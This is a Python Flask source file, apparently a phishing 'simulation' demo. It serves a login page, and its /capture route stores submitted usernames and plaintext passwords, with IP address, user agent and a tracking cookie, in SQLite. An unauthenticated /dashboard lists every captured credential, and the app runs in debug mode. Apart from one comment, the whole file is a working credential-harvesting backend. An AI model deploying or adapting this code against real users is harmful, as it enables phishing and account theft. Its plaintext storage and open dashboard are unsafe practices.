
from flask import Flask, render_template, request, redirect, url_for, make_response
import sqlite3, datetime, os

DB_PATH = os.path.join(os.path.dirname(__file__), 'demo.db')
app = Flask(__name__)

def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS submissions(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                password TEXT,
                user_agent TEXT,
                ip TEXT,
                cookie_val TEXT,
                created_at TEXT
            );
        ''')
        conn.commit()


init_db()

def insert_submission(username, password, user_agent, ip, cookie_val):
    with sqlite3.connect(DB_PATH) as conn:
        c = conn.cursor()
        c.execute('''
            INSERT INTO submissions(username, password, user_agent, ip, cookie_val, created_at)
            VALUES (?,?,?,?,?,?)
        ''', (username, password, user_agent, ip, cookie_val, datetime.datetime.utcnow().isoformat()))
        conn.commit()

def fetch_all():
    with sqlite3.connect(DB_PATH) as conn:
        c = conn.cursor()
        c.execute('''SELECT id, username, password, user_agent, ip, cookie_val, created_at
                     FROM submissions ORDER BY id DESC''')
        return c.fetchall()

@app.route('/', methods=['GET'])
def login_page():
    resp = make_response(render_template('login.html'))
    if not request.cookies.get('sim_demo'):
        resp.set_cookie('sim_demo', 'session-' + datetime.datetime.utcnow().strftime('%H%M%S'))
    return resp

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username','').strip()
    password = request.form.get('password','').strip()  # SIMULACIÓN: No usar datos reales
    user_agent = request.headers.get('User-Agent','?')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    cookie_val = request.cookies.get('sim_demo','')
    insert_submission(username, password, user_agent, ip, cookie_val)
    return redirect(url_for('success'))

@app.route('/success', methods=['GET'])
def success():
    return render_template('success.html')

@app.route('/dashboard', methods=['GET'])
def dashboard():
    rows = fetch_all()
    return render_template('dashboard.html', rows=rows)

if __name__ == '__main__':
    app.run(debug=True)
